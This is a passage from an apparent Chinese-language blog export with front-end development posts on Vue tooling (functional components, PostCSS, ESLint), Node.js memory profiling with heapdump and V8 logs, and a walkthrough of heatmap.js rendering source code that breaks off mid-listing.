<h2 id="函数式组件"><a href="#函数式组件" class="headerlink" title="函数式组件"></a>函数式组件</h2><p>每个组件实例在创建时都需要做一些设置，比如数据响应系统、组件生命周期等。函数式组件自身没有状态（无法使用this关键字），也不会在开发者工具中显示。但在速度更快、使用内存更少。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  functional: <span class="literal">true</span>,</span><br><span class="line">  render (h, &#123; props, children &#125;) &#123;</span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">`h<span class="subst">$&#123;props.level&#125;</span>`</span>, children)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用模板<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">functional</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"my-component"</span>&gt;</span>&#123;&#123; props.message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="使用PostCSS为CSS自动添加前缀"><a href="#使用PostCSS为CSS自动添加前缀" class="headerlink" title="使用PostCSS为CSS自动添加前缀"></a>使用PostCSS为CSS自动添加前缀</h2><p>为CSS自动添加前缀可以提高样式对浏览器的兼容性。PostCSS是一个专门用于CSS后处理的库。它拥有一个非常模块化的架构，通过添加插件来使用各种方式处理CSS。PostCSS不需要额外安装，vue-loader中已经包含了它，我们只需要按需安装插件即可，我们需要安装autoprefixer这个包。<br>在根目录添加postcss.config.js配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">'autoprefixer'</span>),</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样autoprefixer就会自动处理我们的CSS代码。</p>
<h2 id="通过ESLint提升代码质量和风格"><a href="#通过ESLint提升代码质量和风格" class="headerlink" title="通过ESLint提升代码质量和风格"></a>通过ESLint提升代码质量和风格</h2><p>ESLint提供了一系列可以开启和关闭的lint规则，有助于保持源代码的整洁性和一致性。</p>
<h2 id="命令行ESLint"><a href="#命令行ESLint" class="headerlink" title="命令行ESLint"></a>命令行ESLint</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eslint --ext .js, .jsx, .vue src</span><br></pre></td></tr></table></figure>
<h2 id="在Webpack中使用ESlint"><a href="#在Webpack中使用ESlint" class="headerlink" title="在Webpack中使用ESlint"></a>在Webpack中使用ESlint</h2><p>添加一条新的ESLint加载器规则。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">"module": &#123;</span><br><span class="line">  "rules": [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"test"</span>: /\.(jsx?|vue)$/,</span><br><span class="line">      <span class="attr">"loader"</span>: <span class="string">"eslint-loader"</span>,</span><br><span class="line">      <span class="attr">"enforce"</span>: <span class="string">"pre"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Jest单元测试"><a href="#Jest单元测试" class="headerlink" title="Jest单元测试"></a>Jest单元测试</h2><p>我们需要都重要的代码进行单元测试，推荐使用Jest。</p>
<h2 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h2><p>可以使用vue-i18n</p>
<h2 id="服务端渲染（SSR）"><a href="#服务端渲染（SSR）" class="headerlink" title="服务端渲染（SSR）"></a>服务端渲染（SSR）</h2><p>配置较多，这里不赘述。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>node.js服务内存与cpu分析</title>
    <url>/2020/02/21/node-js%E6%9C%8D%E5%8A%A1%E5%86%85%E5%AD%98%E4%B8%8Ecpu%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>内存与cpu分析<br><a id="more"></a></p>
<h2 id="V8的垃圾回收机制与内存限制"><a href="#V8的垃圾回收机制与内存限制" class="headerlink" title="V8的垃圾回收机制与内存限制"></a>V8的垃圾回收机制与内存限制</h2><p>node.js的内存管理和JavaScript执行引擎V8息息相关。V8垃圾回收机制必须要控制内存的上限（一般64位系统1.4G、32位系统0.7G）。如果内存不限制，做垃圾回收引起JavaScript线程暂停时间过长，会使应用的响应能力直线下降。</p>
<h2 id="查看v8内存信息"><a href="#查看v8内存信息" class="headerlink" title="查看v8内存信息"></a>查看v8内存信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ~ node</span><br><span class="line">&gt; process.memoryUsage();</span><br><span class="line">&#123; rss: 21499904,</span><br><span class="line">  heapTotal: 7684096,</span><br><span class="line">  heapUsed: 4956992,</span><br><span class="line">  external: 16823 &#125;</span><br></pre></td></tr></table></figure>
<p>heapTotal和heapUsed是V8堆内存的使用情况。</p>
<h2 id="查看系统总内存和闲置内存"><a href="#查看系统总内存和闲置内存" class="headerlink" title="查看系统总内存和闲置内存"></a>查看系统总内存和闲置内存</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ~ node</span><br><span class="line">&gt; os.totalmem()</span><br><span class="line">8589934592</span><br><span class="line">&gt; os.freemem()</span><br><span class="line">281985024</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，V8只能利用系统(如服务器)的一部分内存。</p>
<h2 id="查看垃圾回收日志"><a href="#查看垃圾回收日志" class="headerlink" title="查看垃圾回收日志"></a>查看垃圾回收日志</h2><p>内存利用可以分析垃圾回收日志<br>示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i ++) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node -prof test.js</span><br></pre></td></tr></table></figure></p>
<p>将生成的log文件重命名<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv isolate-0x103800000-v8.log v8.log</span><br></pre></td></tr></table></figure></p>
<p>使用node-tick-processor npm包分析<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">node-tick-processor v8.log</span><br></pre></td></tr></table></figure></p>
<p>得到的统计结果中垃圾回收信息如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[GC]:</span><br><span class="line">  ticks  total  nonlib   name</span><br><span class="line">     3    5.1%</span><br></pre></td></tr></table></figure></p>
<p>由于代码不断分配对象，垃圾回收所占时间为5.1%，显然是不合理的。</p>
<h2 id="内存泄漏排查"><a href="#内存泄漏排查" class="headerlink" title="内存泄漏排查"></a>内存泄漏排查</h2><p>我们通过工具来排查是否存在内存泄漏，这里以node-heapdump为例。<br>示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> heapdump = <span class="built_in">require</span>(<span class="string">'heapdump'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> leakArray = [];</span><br><span class="line"><span class="keyword">var</span> leak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  leakArray.push(<span class="string">"leak"</span> + <span class="built_in">Math</span>.random());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  leak();</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span> &#125;);</span><br><span class="line">  res.end(<span class="string">'Hello World\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">1337</span>);</span><br></pre></td></tr></table></figure></p>
<p>通过向服务器进程发送SIGUSR2信号，可以不断抓拍堆内存快照。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kill -USR2 &lt;pid&gt;</span><br></pre></td></tr></table></figure></p>
<p>快照会在目录下自动生成，在Chrome开发者工具-Memory-Profiles中导入快照，选择Comparison就可以对比前后几个快照的垃圾回收情况，从而定位内存泄漏问题。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concatenated</span><br><span class="line"> leak0.5140695987557682</span><br><span class="line"> leak0.48309920416566277</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></p>
<h2 id="编码注意事项"><a href="#编码注意事项" class="headerlink" title="编码注意事项"></a>编码注意事项</h2><h3 id="慎用全局变量"><a href="#慎用全局变量" class="headerlink" title="慎用全局变量"></a>慎用全局变量</h3><p>它会常驻内存中，可以通过delete或赋值（推荐）释放它们。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">global.foo = <span class="string">'1'</span>;</span><br><span class="line"><span class="keyword">delete</span> global.foo;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">global.foo = <span class="literal">undefined</span>; <span class="comment">// or null</span></span><br></pre></td></tr></table></figure></p>
<h3 id="减少闭包"><a href="#减少闭包" class="headerlink" title="减少闭包"></a>减少闭包</h3><p>中间函数作用域不会释放，会占用内存，直到不再有引用。</p>
<h3 id="善用堆外内存"><a href="#善用堆外内存" class="headerlink" title="善用堆外内存"></a>善用堆外内存</h3><p>如Buffer对象，内存是C++管理的，不受V8堆内存的限制。</p>
<h3 id="慎将内存当缓存"><a href="#慎将内存当缓存" class="headerlink" title="慎将内存当缓存"></a>慎将内存当缓存</h3><p>如果确实有必要，需要增加缓存限制策略。对于大量缓存，可以使用进程外的缓存，如结合Redis。</p>
<h3 id="关注队列状态"><a href="#关注队列状态" class="headerlink" title="关注队列状态"></a>关注队列状态</h3><p>如日志收集，若瞬间写入海量数据，会造成写入操作堆积，内存泄漏。可以采用堆积监控报警、异步调用超时机制等给消费速度设定下限值。</p>
<h3 id="大内存应用"><a href="#大内存应用" class="headerlink" title="大内存应用"></a>大内存应用</h3><p>可以使用”流”来操作大文件。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>node.js</tag>
      </tags>
  </entry>
  <entry>
    <title>heatmap.js源码解读</title>
    <url>/2020/03/29/heatmap-js%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p><a href="https://github.com/pa7/heatmap.js" target="_blank" rel="noopener">heatmap.js</a> (<a href="https://github.com/pa7/heatmap.js)可以很方便地绘制热力图，[官网首页](https://www.patrick-wied.at/static/heatmapjs/)" target="_blank" rel="noopener">https://github.com/pa7/heatmap.js)可以很方便地绘制热力图，[官网首页](https://www.patrick-wied.at/static/heatmapjs/)</a> （<a href="https://www.patrick-wied.at/static/heatmapjs/）给出的代码示例：" target="_blank" rel="noopener">https://www.patrick-wied.at/static/heatmapjs/）给出的代码示例：</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> heatmap = h337.create(&#123;</span><br><span class="line">  container: domElement</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">heatmap.setData(&#123;</span><br><span class="line">  max: <span class="number">5</span>,</span><br><span class="line">  data: [&#123; <span class="attr">x</span>: <span class="number">10</span>, <span class="attr">y</span>: <span class="number">15</span>, <span class="attr">value</span>: <span class="number">5</span>&#125;, ...]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>那么它是如何实现热力图绘制的呢？本文将为你全面解读heatmap.js源码。<br><a id="more"></a></p>
<h1 id="热力图原理"><a href="#热力图原理" class="headerlink" title="热力图原理"></a>热力图原理</h1><h2 id="点模板"><a href="#点模板" class="headerlink" title="点模板"></a>点模板</h2><p>点模板对应热力图数据点。它是一个圆点，根据可配置的模糊因子（blurFactor，默认.85），可使圆点带有模糊效果（借助createRadialGradient）。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _getPointTemplate = <span class="function"><span class="keyword">function</span>(<span class="params">radius, blurFactor</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> tplCanvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">	<span class="keyword">var</span> tplCtx = tplCanvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">	<span class="keyword">var</span> x = radius;</span><br><span class="line">	<span class="keyword">var</span> y = radius;</span><br><span class="line">	tplCanvas.width = tplCanvas.height = radius*<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (blurFactor == <span class="number">1</span>) &#123;</span><br><span class="line">		tplCtx.beginPath();</span><br><span class="line">		tplCtx.arc(x, y, radius, <span class="number">0</span>, <span class="number">2</span> * <span class="built_in">Math</span>.PI, <span class="literal">false</span>);</span><br><span class="line">		tplCtx.fillStyle = <span class="string">'rgba(0,0,0,1)'</span>;</span><br><span class="line">		tplCtx.fill();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> gradient = tplCtx.createRadialGradient(x, y, radius*blurFactor, x, y, radius);</span><br><span class="line">		gradient.addColorStop(<span class="number">0</span>, <span class="string">'rgba(0,0,0,1)'</span>);</span><br><span class="line">		gradient.addColorStop(<span class="number">1</span>, <span class="string">'rgba(0,0,0,0)'</span>);</span><br><span class="line">		tplCtx.fillStyle = gradient;</span><br><span class="line">		tplCtx.fillRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>*radius, <span class="number">2</span>*radius);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tplCanvas;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="灰度（透明度）叠加"><a href="#灰度（透明度）叠加" class="headerlink" title="灰度（透明度）叠加"></a>灰度（透明度）叠加</h2><p>这个热力图的”灵魂”。rgb通道是无法线性叠加呈现效果的，但是透明度是近似线性的。<code>var templateAlpha = (value-min)/(max-min);</code>，根据数据点的比率，对应于透明度的值alpha，我们在canvas上（shadowCtx）绘制一个数据点。它们的透明度是可以叠加的，值越大，越”不透明”。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_drawAlpha: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> min = <span class="keyword">this</span>._min = data.min;</span><br><span class="line">	<span class="keyword">var</span> max = <span class="keyword">this</span>._max = data.max;</span><br><span class="line">	<span class="keyword">var</span> data = data.data || [];</span><br><span class="line">	<span class="keyword">var</span> dataLen = data.length;</span><br><span class="line">	<span class="comment">// on a point basis?</span></span><br><span class="line">	<span class="keyword">var</span> blur = <span class="number">1</span> - <span class="keyword">this</span>._blur;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(dataLen--) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> point = data[dataLen];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> x = point.x;</span><br><span class="line">		<span class="keyword">var</span> y = point.y;</span><br><span class="line">		<span class="keyword">var</span> radius = point.radius;</span><br><span class="line">		<span class="comment">// if value is bigger than max</span></span><br><span class="line">		<span class="comment">// use max as value</span></span><br><span class="line">		<span class="keyword">var</span> value = <span class="built_in">Math</span>.min(point.value, max);</span><br><span class="line">		<span class="keyword">var</span> rectX = x - radius;</span><br><span class="line">		<span class="keyword">var</span> rectY = y - radius;</span><br><span class="line">		<span class="keyword">var</span> shadowCtx = <span class="keyword">this</span>.shadowCtx;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> tpl;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">this</span>._templates[radius]) &#123;</span><br><span class="line">			<span class="keyword">this</span>._templates[radius] = tpl = _getPointTemplate(radius, blur);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			tpl = <span class="keyword">this</span>._templates[radius];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// value from minimum / value range</span></span><br><span class="line">		<span class="comment">// =&gt; [0, 1]</span></span><br><span class="line">		<span class="keyword">var</span> templateAlpha = (value-min)/(max-min);</span><br><span class="line">		<span class="comment">// this fixes #176: small values are not visible because globalAlpha &lt; .01 cannot be read from imageData</span></span><br><span class="line">		shadowCtx.globalAlpha = templateAlpha &lt; <span class="number">.01</span> ? <span class="number">.01</span> : templateAlpha;</span><br><span class="line"></span><br><span class="line">		shadowCtx.drawImage(tpl, rectX, rectY);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// update renderBoundaries</span></span><br><span class="line">		<span class="keyword">if</span> (rectX &lt; <span class="keyword">this</span>._renderBoundaries[<span class="number">0</span>]) &#123;</span><br><span class="line">				<span class="keyword">this</span>._renderBoundaries[<span class="number">0</span>] = rectX;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (rectY &lt; <span class="keyword">this</span>._renderBoundaries[<span class="number">1</span>]) &#123;</span><br><span class="line">				<span class="keyword">this</span>._renderBoundaries[<span class="number">1</span>] = rectY;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (rectX + <span class="number">2</span>*radius &gt; <span class="keyword">this</span>._renderBoundaries[<span class="number">2</span>]) &#123;</span><br><span class="line">				<span class="keyword">this</span>._renderBoundaries[<span class="number">2</span>] = rectX + <span class="number">2</span>*radius;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (rectY + <span class="number">2</span>*radius &gt; <span class="keyword">this</span>._renderBoundaries[<span class="number">3</span>]) &#123;</span><br><span class="line">				<span class="keyword">this</span>._renderBoundaries[<span class="number">3</span>] = rectY + <span class="number">2</span>*radius;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h2 id="线性色谱"><a href="#线性色谱" class="headerlink" title="线性色谱"></a>线性色谱</h2><p>通过createLinearGradient你可以自主定制自己的热力图色谱（config.gradient）。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _getColorPalette = <span class="function"><span class="keyword">function</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> gradientConfig = config.gradient || config.defaultGradient;</span><br><span class="line">	<span class="keyword">var</span> paletteCanvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">	<span class="keyword">var</span> paletteCtx = paletteCanvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line"></span><br><span class="line">	paletteCanvas.width = <span class="number">256</span>;</span><br><span class="line">	paletteCanvas.height = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> gradient = paletteCtx.createLinearGradient(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> gradientConfig) &#123;</span><br><span class="line">		gradient.addColorStop(key, gradientConfig[key]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	paletteCtx.fillStyle = gradient;</span><br><span class="line">	paletteCtx.fillRect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> paletteCtx.getImageData(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">1</span>).data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h2 id="着色"><a href="#着色" class="headerlink" title="着色"></a>着色</h2><p>最后，透明度的叠加值(this.shadowCtx.getImageData)映射到线性色谱(palette)，取线性色谱中的颜色为canvas上色(putImageData)就得到最终的热力图了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_colorize: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> x = <span class="keyword">this</span>._renderBoundaries[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">var</span> y = <span class="keyword">this</span>._renderBoundaries[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">var</span> width = <span class="keyword">this</span>._renderBoundaries[<span class="number">2</span>] - x;</span><br><span class="line">	<span class="keyword">var</span> height = <span class="keyword">this</span>._renderBoundaries[<span class="number">3</span>] - y;</span><br><span class="line">	<span class="keyword">var</span> maxWidth = <span class="keyword">this</span>._width;</span><br><span class="line">	<span class="keyword">var</span> maxHeight = <span class="keyword">this</span>._height;</span><br><span class="line">	<span class="keyword">var</span> opacity = <span class="keyword">this</span>._opacity;</span><br><span class="line">	<span class="keyword">var</span> maxOpacity = <span class="keyword">this</span>._maxOpacity;</span><br><span class="line">	<span class="keyword">var</span> minOpacity = <span class="keyword">this</span>._minOpacity;</span><br><span class="line">	<span class="keyword">var</span> useGradientOpacity = <span class="keyword">this</span>._useGradientOpacity;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		x = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		y = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (x + width &gt; maxWidth) &#123;</span><br><span class="line">		width = maxWidth - x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (y + height &gt; maxHeight) &#123;</span><br><span class="line">		height = maxHeight - y;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> img = <span class="keyword">this</span>.shadowCtx.getImageData(x, y, width, height);</span><br><span class="line">	<span class="keyword">var</span> imgData = img.data;</span><br><span class="line">	<span class="keyword">var</span> len = imgData.length;</span><br><span class="line">	<span class="keyword">var</span> palette = <span class="keyword">this</span>._palette;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">3</span>; i &lt; len; i+= <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="keyword">var</span> alpha = imgData[i];</span><br><span class="line">		<span class="keyword">var</span> offset = alpha * <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!offset) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">var</span> finalAlpha;</span><br><span class="line">		<span class="keyword">if</span> (opacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			finalAlpha = opacity;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (alpha &lt; maxOpacity) &#123;</span><br><span class="line">				<span class="keyword">if</span> (alpha &lt; minOpacity) &#123;</span><br><span class="line">					finalAlpha = minOpacity;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					finalAlpha = alpha;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				finalAlpha = maxOpacity;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		imgData[i<span class="number">-3</span>] = palette[offset];</span><br><span class="line">		imgData[i<span class="number">-2</span>] = palette[offset + <span class="number">1</span>];</span><br><span class="line">		imgData[i<span class="number">-1</span>] = palette[offset + <span class="number">2</span>];</span><br><span class="line">		imgData[i] = useGradientOpacity ? palette[offset + <span class="number">3</span>] : finalAlpha;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	img.data = imgData;</span><br><span class="line">	<span class="keyword">this</span>.ctx.putImageData(img, x, y);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">this</span>._renderBoundaries = [<span class="number">1000</span>, <span class="number">1000</span>, <span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上就是heatmap.js库最精华的部分了。当然，为了让库的设计更完备，它还做了很多其他工作。</p>
<h2 id="Coordinator"><a href="#Coordinator" class="headerlink" title="Coordinator"></a>Coordinator</h2><p>自己实现了一个发布订阅模式来作为整个类库功能的调度者。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Coordinator = (<span class="function"><span class="keyword">function</span> <span class="title">CoordinatorClosure</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Coordinator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cStore = &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Coordinator.prototype = &#123;</span><br><span class="line">    on: <span class="function"><span class="keyword">function</span>(<span class="params">evtName, callback, scope</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cStore = <span class="keyword">this</span>.cStore;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!cStore[evtName]) &#123;</span><br><span class="line">        cStore[evtName] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    cStore[evtName].push((<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> callback.call(scope, data);</span><br><span class="line">    &#125;));</span><br><span class="line">    &#125;,</span><br><span class="line">    emit: <span class="function"><span class="keyword">function</span>(<span class="params">evtName, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> cStore = <span class="keyword">this</span>.cStore;</span><br><span class="line">    <span class="keyword">if</span> (cStore[evtName]) &#123;</span><br><span class="line">        <span class="keyword">var</span> len = cStore[evtName].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> callback = cStore[evtName][i];</span><br><span class="line">        callback(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Coordinator;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
<p>如你需要renderpartial、renderall，只需要emit就可以了。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">coordinator.on(<span class="string">'renderpartial'</span>, renderer.renderPartial, renderer);</span><br><span class="line">coordinator.on(<span class="string">'renderall'</span>, renderer.renderAll, renderer);</span><br></pre></td></tr></table></figure></p>
<h2 id="plugin"><a href="#plugin" class="headerlink" title="plugin"></a>plugin</h2><p>提供了插件接口，你可以使用heatmap.js提供的如gmaps-heatmap等各种插件。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (config[<span class="string">'plugin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">var</span> pluginToLoad = config[<span class="string">'plugin'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!HeatmapConfig.plugins[pluginToLoad]) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Plugin \''</span>+ pluginToLoad + <span class="string">'\' not found. Maybe it was not registered.'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> plugin = HeatmapConfig.plugins[pluginToLoad];</span><br><span class="line">    <span class="comment">// set plugin renderer and store</span></span><br><span class="line">    <span class="keyword">this</span>._renderer = <span class="keyword">new</span> plugin.renderer(config);</span><br><span class="line">    <span class="keyword">this</span>._store = <span class="keyword">new</span> plugin.store(config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Heatmap"><a href="#Heatmap" class="headerlink" title="Heatmap"></a>Heatmap</h2><p>实现了Heatmap构造方法，使用户可以通过heatmap实例调用各种功能。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Heatmap.prototype = &#123;</span><br><span class="line">    addData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    removeData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    setData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    setDataMax: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    setDataMin: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    configure: <span class="function"><span class="keyword">function</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    repaint: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    getData: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    getDataURL: <span class="function"><span class="keyword">function</span>(<span 